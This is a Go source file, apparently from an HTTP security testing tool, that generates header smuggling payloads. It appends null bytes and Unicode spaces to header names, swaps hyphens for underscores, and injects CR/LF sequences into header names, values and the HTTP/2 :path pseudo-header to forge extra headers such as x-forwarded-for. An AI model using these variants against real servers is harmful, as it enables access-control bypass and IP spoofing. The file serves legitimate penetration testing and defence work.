package main

import (
	"fmt"
	"strings"
)

type SmugglingMethod string

const (
	HeaderSmugglingNone         SmugglingMethod = "no header smuggling"
	HeaderSmugglingUnderscore                   = "header smuggling via underscore"
	HeaderSmugglingSpacedHeader                 = "header smuggling via adding space"
	HeaderSmugglingNewlineValue                 = "header smuggling via newline in header value"
	HeaderSmugglingNewlineName                  = "header smuggling via newline in header name"
	HeaderSmugglingNewlinePath                  = "header smuggling via newline in header path"
)

var SmugglingMethods = []SmugglingMethod{
	HeaderSmugglingNone,
	HeaderSmugglingSpacedHeader,
	HeaderSmugglingUnderscore,
	HeaderSmugglingNewlinePath,
	HeaderSmugglingNewlineValue,
	HeaderSmugglingNewlineName,
}

func (s SmugglingMethod) Smuggle(h *Header, variant interface{}) {
	switch s {
	case HeaderSmugglingNone:
		// no action
	case HeaderSmugglingUnderscore:
		h.Name = strings.Replace(h.Name, "-", "_", -1)

	case HeaderSmugglingSpacedHeader:
		space := variant.(string)
		h.Name += space

	case HeaderSmugglingNewlineValue:
		v := variant.(newlineHeaderParams)
		h.Value = fmt.Sprintf("val%s%s:%s", v.Newline, h.Name, h.Value)
		h.Name = v.Header

	case HeaderSmugglingNewlineName:
		v := variant.(newlineHeaderParams)
		h.Name = fmt.Sprintf("%s%s%s", v.Header, v.Newline, h.Name)

	case HeaderSmugglingNewlinePath:
		v := variant.(newlinePathParams)
		h.Value = fmt.Sprintf("%s HTTP/1.1%s%s: %s%sfake: ", v.Path, v.Newline, h.Name, h.Value, v.Newline)
		h.Name = ":path"

	default:
		panic(fmt.Errorf("invalid header smuggling: %#v", s))
	}
}

func (s SmugglingMethod) GetVariants(path string) (variants []interface{}) {
	newlines := []string{"\r\n", "\r", "\n"}
	switch s {
	case HeaderSmugglingNone, HeaderSmugglingUnderscore:
		return []interface{}{nil}

	case HeaderSmugglingSpacedHeader:
		return []interface{}{"\x00", " ", "\t", "\v", "\u0085", "\u00A0", "\U000130BA"}

	case HeaderSmugglingNewlineName:
		for _, nl := range newlines {
			for _, h := range []string{"x", "x:"} {
				variants = append(variants, newlineHeaderParams{nl, h})
			}
		}
		return

	case HeaderSmugglingNewlineValue:
		for _, nl := range newlines {
			for _, h := range []string{"header", " header", "x-forwarded-for"} {
				variants = append(variants, newlineHeaderParams{nl, h})
			}
		}
		return

	case HeaderSmugglingNewlinePath:
		for _, nl := range newlines {
			variants = append(variants, newlinePathParams{nl, path})
		}
		return

	default:
		panic(fmt.Errorf("invalid header smuggling: %#v", s))
	}
}

type newlineHeaderParams struct {
	Newline, Header string
}

type newlinePathParams struct {
	Newline, Path string
}
